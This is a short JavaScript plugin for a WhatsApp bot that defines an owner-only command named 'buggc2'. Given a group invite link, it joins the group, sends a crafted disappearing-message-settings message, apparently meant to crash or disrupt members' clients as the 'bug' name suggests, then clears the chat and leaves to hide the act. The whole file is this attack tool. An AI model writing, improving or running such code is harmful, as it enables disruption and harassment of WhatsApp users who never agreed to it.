let handler = async (m, { conn, text }) => {
    let link = text.replace('https://chat.whatsapp.com/', '')
    let { gid: target } = await conn.acceptInvite(`${link}`)
    await conn.relayWAMessage(global.mm = conn.
        prepareMessageFromContent(target, conn.
            prepareDisappearingMessageSettingContent(0),
            {}), { waitForAck: !0 })
    await conn.modifyChat(target, 'clear')
    await conn.groupLeave(target)
}
handler.help = ['buggc2 *link*']
handler.tags = ['owner']
handler.command = /^buggc2$/i
handler.owner = true
module.exports = handler
